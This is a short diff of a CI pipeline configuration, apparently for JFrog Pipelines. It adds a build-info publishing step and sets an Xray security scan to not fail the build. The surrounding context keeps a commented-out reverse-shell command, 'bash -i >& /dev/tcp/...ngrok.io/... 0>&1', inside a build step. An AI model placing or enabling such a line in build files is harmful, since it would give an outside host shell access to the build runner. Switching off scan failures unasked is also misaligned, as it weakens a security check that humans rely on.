@@ -62,10 +62,19 @@ pipelines:
             #- bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/11712 0>&1
           onSuccess:
             - echo "succes"
-            
+      
+      - name: build_info
+        type: PublishBuildInfo
+        configuration:
+          inputSteps:
+            - name: docker_build
+          outputResources:
+            - name: build_info
+      
       - name: xray_scan
         type: XrayScan
         configuration:
+          failOnScan: false
           inputResources:
             - name: build_info
           inputSteps: 
